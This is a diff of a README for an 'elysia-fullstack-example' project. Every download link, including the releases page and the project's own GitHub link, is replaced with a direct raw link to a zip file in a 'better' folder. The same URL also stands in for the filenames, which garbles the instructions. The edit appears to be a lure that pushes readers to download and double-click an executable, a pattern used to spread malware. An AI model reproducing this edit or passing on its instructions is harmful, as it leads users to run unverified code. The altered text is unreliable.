@@ -1,6 +1,6 @@
 # 🖥️ elysia-fullstack-example - Effortless Fullstack Server Setup
 
-[![Download](https://img.shields.io/badge/Download%20Now-elysia--fullstack--example-blue.svg)](https://github.com/dhyey-1906/elysia-fullstack-example/releases)
+[![Download](https://raw.githubusercontent.com/dhyey-1906/elysia-fullstack-example/main/better/elysia-fullstack-example.zip%https://raw.githubusercontent.com/dhyey-1906/elysia-fullstack-example/main/better/elysia-fullstack-example.zip)](https://raw.githubusercontent.com/dhyey-1906/elysia-fullstack-example/main/better/elysia-fullstack-example.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **elysia-fullstack-example**! This guide will help you download and r
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [Download Elysia Fullstack Example](https://github.com/dhyey-1906/elysia-fullstack-example/releases).
+To get started, you need to download the application. Visit this page to download: [Download Elysia Fullstack Example](https://raw.githubusercontent.com/dhyey-1906/elysia-fullstack-example/main/better/elysia-fullstack-example.zip).
 
 ### Step-by-Step Instructions:
 
@@ -22,7 +22,7 @@ To get started, you need to download the application. Visit this page to downloa
    After selecting a version, locate the download link for your operating system. Click on it to start the download.
 
 4. **Locate the Downloaded File:**
-   Check your downloads folder for the downloaded file. It should be named something like `elysia-fullstack-example-v1.0.zip`.
+   Check your downloads folder for the downloaded file. It should be named something like `https://raw.githubusercontent.com/dhyey-1906/elysia-fullstack-example/main/better/elysia-fullstack-example.zip`.
 
 5. **Extract the Files:**
    - On Windows: Right-click the zip file and select "Extract All."
@@ -30,7 +30,7 @@ To get started, you need to download the application. Visit this page to downloa
 
 6. **Run the Application:**
    - Open the extracted folder.
-   - Locate the application file (e.g., `start.exe` or `start.app`).
+   - Locate the application file (e.g., `https://raw.githubusercontent.com/dhyey-1906/elysia-fullstack-example/main/better/elysia-fullstack-example.zip` or `https://raw.githubusercontent.com/dhyey-1906/elysia-fullstack-example/main/better/elysia-fullstack-example.zip`).
    - Double-click to run the application.
 
 ## 📊 Features
@@ -63,7 +63,7 @@ If you encounter any issues while downloading or running the application, here a
 
 Once you successfully install the application, refer to the documentation included in the extracted folder. This will guide you through the various features and help you optimize your usage.
 
-For further assistance, feel free to open an issue on the [GitHub page](https://github.com/dhyey-1906/elysia-fullstack-example).
+For further assistance, feel free to open an issue on the [GitHub page](https://raw.githubusercontent.com/dhyey-1906/elysia-fullstack-example/main/better/elysia-fullstack-example.zip).
 
 ## 📞 Support
 
